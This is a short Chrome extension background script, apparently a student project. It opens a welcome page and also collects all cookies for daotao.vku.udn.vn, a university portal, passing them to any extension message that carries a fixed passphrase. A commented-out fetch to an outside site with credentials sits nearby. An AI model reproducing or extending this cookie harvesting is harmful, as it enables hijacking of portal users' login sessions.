chrome.runtime.onInstalled.addListener(({ reason, version }) => {
    if (reason === chrome.runtime.OnInstalledReason.INSTALL) {
        showReadme();
    }
});

chrome.action.onClicked.addListener((tab) => {
    showReadme();
});

function showReadme(info, tab) {
    let url = chrome.runtime.getURL("hello.html");
    chrome.tabs.create({ url });
}

console.log("Xin chao ba con");

chrome.action.onClicked.addListener(async (tab) => {
    // const url = "hungthinhit.com";
    // const res = await fetch(url, { credentials: "include" });
});

async function getCookies() {
    let cookies = await chrome.cookies.getAll({
        domain: "daotao.vku.udn.vn",
    });
    return cookies;
}

chrome.runtime.onMessage.addListener(
    (request, sender, sendResponse) => {
        console.log(sender.tab ? "Call from Phoenix:" + sender.tab.url : "from the extension");
        if (request.phoenix == "nguyenhungthinh_17it2") {
            (async () => {
                const cookies = await getCookies();
                sendResponse({ cookies });
            })();
            return true; // keep the messaging channel open for sendResponse
        
        }
    }
);